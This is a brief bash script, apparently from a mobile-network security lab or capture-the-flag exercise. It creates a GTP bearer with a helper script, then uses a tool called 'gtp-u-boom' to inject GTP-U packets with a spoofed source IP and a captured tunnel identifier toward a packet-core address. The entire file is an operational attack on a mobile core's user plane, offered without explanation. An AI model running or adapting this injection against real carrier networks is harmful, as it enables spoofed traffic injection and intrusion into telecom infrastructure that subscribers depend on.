#!/usr/bin/env bash

echo "What is the public IP ?"
read SGW_IP
echo -n "[+] Creating Bearer..."
export $(python3 scripts/create_bearer.py 999990000000001 1234567890 loltel | grep -v "Session" | xargs -d '\n')
echo "ok"
echo "[+] Starting GTP-U packets injection..."
./wg2/gtp-u-boom/gtp-u-boom -dst-ip 45.8.8.45 -src-ip $SGW_IP -teid $PGWU_TEID -data $GTPU_PAYLOAD

